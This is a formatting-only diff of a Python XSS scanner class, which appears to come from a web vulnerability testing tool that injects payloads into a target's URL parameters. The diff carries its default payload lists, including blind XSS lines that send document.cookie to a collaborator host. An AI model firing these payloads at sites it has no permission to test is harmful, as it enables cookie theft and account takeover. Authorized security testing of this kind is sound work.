@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import re
 import random
+import re
 import urllib.parse
-from typing import Dict, List, Optional, Any
+from typing import Any, Dict, List, Optional
+
+from core.logger import (log_debug, log_error, log_info, log_success,
+                         log_warning)
 from modules.core.http_client import HTTPClient
 from modules.core.payload_manager import PayloadManager
-from core.logger import log_info, log_success, log_warning, log_error, log_debug
+
 
 class XSSScanner:
     """
@@ -16,7 +19,7 @@ class XSSScanner:
     """
 
     def __init__(self, target: str, verbose: bool = False, threads: int = 10):
-        self.target = target.rstrip('/')
+        self.target = target.rstrip("/")
         self.verbose = verbose
         self.threads = threads
         self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
@@ -27,7 +30,9 @@ class XSSScanner:
         self.parameters = {}
 
         # Load payloads from Payload Manager
-        self.reflected_payloads = self._load_payloads("xss", ["basic", "script", "img", "svg", "body", "input", "iframe"])
+        self.reflected_payloads = self._load_payloads(
+            "xss", ["basic", "script", "img", "svg", "body", "input", "iframe"]
+        )
         self.dom_payloads = self._load_payloads("xss", ["dom"])
         self.blind_payloads = self._load_payloads("xss", ["blind"])
         self.mutation_payloads = self._load_payloads("xss", ["mutation"])
@@ -55,7 +60,7 @@ class XSSScanner:
             "script": [r"<script[^>]*>.*?</script>"],
             "style": [r"<style[^>]*>.*?</style>"],
             "url": [r"url\([^)]*\)", r"href=[\"'][^\"']*[\"']"],
-            "json": [r"\{[^{}]*\"[^\"]*\":\"[^\"]*\"[^{}]*\}"]
+            "json": [r"\{[^{}]*\"[^\"]*\":\"[^\"]*\"[^{}]*\}"],
         }
 
         self.response_patterns = {
@@ -73,7 +78,7 @@ class XSSScanner:
             "documentwrite": [r"document\.write\s*\([^)]*\)"],
             "innerhtml": [r"\.innerHTML\s*=\s*['\"][^'\"]*['\"]"],
             "createelement": [r"createElement\s*\([^)]*\)"],
-            "appendchild": [r"appendChild\s*\([^)]*\)"]
+            "appendchild": [r"appendChild\s*\([^)]*\)"],
         }
 
     def _load_payloads(self, category: str, tags: List[str]) -> List[str]:
@@ -82,8 +87,8 @@ class XSSScanner:
         for tag in tags:
             results = self.payload_manager.get_payloads(category, tags=[tag], limit=100)
             for p in results:
-                if 'value' in p:
-                    payloads.append(p['value'])
+                if "value" in p:
+                    payloads.append(p["value"])
         return list(set(payloads))
 
     def _default_reflected_payloads(self) -> List[str]:
@@ -96,8 +101,8 @@ class XSSScanner:
             "<iframe src=javascript:alert(1)>",
             "javascript:alert(1)",
             "'><script>alert(1)</script>",
-            "\"><script>alert(1)</script>",
-            "<math><maction actiontype=statusline# xss=alert(1)>"
+            '"><script>alert(1)</script>',
+            "<math><maction actiontype=statusline# xss=alert(1)>",
         ]
 
     def _default_dom_payloads(self) -> List[str]:
@@ -106,35 +111,35 @@ class XSSScanner:
             "<img src=x onerror=alert(document.cookie)>",
             "javascript:alert(document.domain)",
             "<svg/onload=alert(document.cookie)>",
-            "';alert(document.domain)//"
+            "';alert(document.domain)//",
         ]
 
     def _default_blind_payloads(self) -> List[str]:
         return [
             "<script>fetch('https://collaborator.example.com/'+document.cookie)</script>",
             "<img src=x onerror=fetch('https://collaborator.example.com/'+document.cookie)>",
-            "<script>new Image().src='https://collaborator.example.com/'+document.cookie</script>"
+            "<script>new Image().src='https://collaborator.example.com/'+document.cookie</script>",
         ]
 
     def _default_mutation_payloads(self) -> List[str]:
         return [
-            "<noscript><p title=\"</noscript><script>alert(1)</script>\">",
+            '<noscript><p title="</noscript><script>alert(1)</script>">',
             "<!--<script>alert(1)</script>-->",
-            "<![CDATA[<script>alert(1)</script>]]>"
+            "<![CDATA[<script>alert(1)</script>]]>",
         ]
 
     def _default_self_xss_payloads(self) -> List[str]:
         return [
             "javascript:alert(1)",
             "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-            "data:text/html,<script>alert(1)</script>"
+            "data:text/html,<script>alert(1)</script>",
         ]
 
     def _default_uxss_payloads(self) -> List[str]:
         return [
             "<iframe src='about:blank' onload='alert(1)'/>",
             "<object data='javascript:alert(1)'/>",
-            "<embed src='javascript:alert(1)'/>"
+            "<embed src='javascript:alert(1)'/>",
         ]
 
     def extract_params(self) -> Dict:
@@ -155,12 +160,13 @@ class XSSScanner:
             "encoded": False,
             "executed": False,
             "context": "unknown",
-            "indicators": []
+            "indicators": [],
         }
         if payload in response:
             analysis["reflected"] = True
             analysis["indicators"].append("plain_reflection")
         import html
+
         if html.escape(payload) in response:
             analysis["encoded"] = True
             analysis["indicators"].append("encoded_reflection")
@@ -197,11 +203,13 @@ class XSSScanner:
                 "url": test_url,
                 "status": resp.status_code,
                 "analysis": analysis,
-                "content_length": len(resp.text)
+                "content_length": len(resp.text),
             }
             self.results.append(result)
             self.vulnerable_params.append(param)
-            log_success(f"Reflected XSS found on {param} with payload: {payload[:50]}...")
+            log_success(
+                f"Reflected XSS found on {param} with payload: {payload[:50]}..."
+            )
             return True
         if self.verbose and analysis["executed"]:
             log_success(f"Potential XSS on {param} (execution indicators detected)")
@@ -211,7 +219,7 @@ class XSSScanner:
                 "payload": payload,
                 "url": test_url,
                 "status": resp.status_code,
-                "analysis": analysis
+                "analysis": analysis,
             }
             self.results.append(result)
             return True
@@ -229,9 +237,19 @@ class XSSScanner:
             return False
         self.payloads_tested += 1
         dom_indicators = [
-            "document.", "window.", "location.", "innerHTML", "outerHTML",
-            "write(", "eval(", "Function(", "setTimeout(", "setInterval(",
-            "createElement(", "appendChild(", "insertAdjacentHTML("
+            "document.",
+            "window.",
+            "location.",
+            "innerHTML",
+            "outerHTML",
+            "write(",
+            "eval(",
+            "Function(",
+            "setTimeout(",
+            "setInterval(",
+            "createElement(",
+            "appendChild(",
+            "insertAdjacentHTML(",
         ]
         found_indicators = [i for i in dom_indicators if i in resp.text]
         if len(found_indicators) > 3:
@@ -241,11 +259,13 @@ class XSSScanner:
                 "payload": payload,
                 "url": test_url,
                 "indicators": found_indicators,
-                "status": resp.status_code
+                "status": resp.status_code,
             }
             self.results.append(result)
             self.vulnerable_params.append(param)
-            log_success(f"DOM-Based XSS potential on {param} (indicators: {', '.join(found_indicators[:3])})")
+            log_success(
+                f"DOM-Based XSS potential on {param} (indicators: {', '.join(found_indicators[:3])})"
+            )
             return True
         return False
 
@@ -266,7 +286,18 @@ class XSSScanner:
         if not resp:
             return False
         self.payloads_tested += 1
-        mutation_indicators = ["<noscript", "<!--", "<![CDATA[", "<?xml", "<%", "<%@", "<%=", "<%$", "<%#", "<%--"]
+        mutation_indicators = [
+            "<noscript",
+            "<!--",
+            "<![CDATA[",
+            "<?xml",
+            "<%",
+            "<%@",
+            "<%=",
+            "<%$",
+            "<%#",
+            "<%--",
+        ]
         found_indicators = [i for i in mutation_indicators if i in resp.text]
         if found_indicators:
             result = {
@@ -275,11 +306,13 @@ class XSSScanner:
                 "payload": payload,
                 "url": test_url,
                 "indicators": found_indicators,
-                "status": resp.status_code
+                "status": resp.status_code,
             }
             self.results.append(result)
             self.vulnerable_params.append(param)
-            log_success(f"Mutation XSS potential on {param} (indicators: {', '.join(found_indicators)})")
+            log_success(
+                f"Mutation XSS potential on {param} (indicators: {', '.join(found_indicators)})"
+            )
             return True
         return False
 
@@ -295,30 +328,34 @@ class XSSScanner:
         log_info(f"Starting XSS scan on: {self.target}")
         params = self.extract_params()
         if not params:
-            log_warning("No GET parameters found. XSS scan works best with parameters like ?q=test")
+            log_warning(
+                "No GET parameters found. XSS scan works best with parameters like ?q=test"
+            )
             return {
                 "target": self.target,
                 "scan_type": "xss",
                 "total_params": 0,
                 "vulnerable_count": 0,
                 "vulnerabilities": [],
-                "payloads_tested": 0
+                "payloads_tested": 0,
             }
         log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
         self.parameters = params
         all_payloads = (
-            self.reflected_payloads +
-            self.dom_payloads +
-            self.blind_payloads +
-            self.mutation_payloads +
-            self.self_xss_payloads +
-            self.uxss_payloads
+            self.reflected_payloads
+            + self.dom_payloads
+            + self.blind_payloads
+            + self.mutation_payloads
+            + self.self_xss_payloads
+            + self.uxss_payloads
         )
         random.shuffle(all_payloads)
         max_payloads = min(len(all_payloads), 500)
         for param in params.keys():
             log_info(f"Testing parameter: {param}")
-            test_payloads = random.sample(all_payloads, min(max_payloads, len(all_payloads)))
+            test_payloads = random.sample(
+                all_payloads, min(max_payloads, len(all_payloads))
+            )
             for i, payload in enumerate(test_payloads):
                 if self.verbose and i % 50 == 0:
                     log_info(f"  Progress: {i}/{len(test_payloads)} payloads tested")
@@ -352,6 +389,6 @@ class XSSScanner:
                 "reflected": len(reflected),
                 "dom_based": len(dom),
                 "mutation": len(mutation),
-                "other": len(self.results) - len(reflected) - len(dom) - len(mutation)
-            }
+                "other": len(self.results) - len(reflected) - len(dom) - len(mutation),
+            },
         }
